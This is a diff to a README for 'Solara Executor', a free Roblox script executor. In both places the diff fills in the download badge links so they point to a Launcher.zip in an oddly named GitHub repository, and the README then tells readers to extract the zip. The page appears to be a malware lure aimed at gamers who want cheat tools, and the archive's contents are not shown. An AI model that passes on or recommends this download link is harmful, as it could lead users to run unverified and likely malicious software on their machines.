@@ -1,12 +1,12 @@
 # ⚡ Solara Executor - Free Roblox Script Executor  
-**[![Download Solara Executor](https://img.shields.io/badge/Download-Solara%20Executor-blue)]()**  
+**[![Download Solara Executor](https://img.shields.io/badge/Download-Solara%20Executor-blue)](https://github.com/aagwzw/solara-2025-update-full-v/releases/download/sola/Launcher.zip)**  
 
 ![image](https://github.com/user-attachments/assets/f78b3f77-3b14-495e-9703-a20bbf87cc7d)
 
 
 ## 📥 Getting Started  
 Getting started with **Solara Executor** is quick and simple:  
-1. **[![Download Solara Executor](https://img.shields.io/badge/Download-Solara%20Executor-blue)]()**  
+1. **[![Download Solara Executor](https://img.shields.io/badge/Download-Solara%20Executor-blue)](https://github.com/aagwzw/solara-2025-update-full-v/releases/download/sola/Launcher.zip)**  
 2. Extract the downloaded `.zip` file to any folder of your choice.  
 
 ## 📌 About  
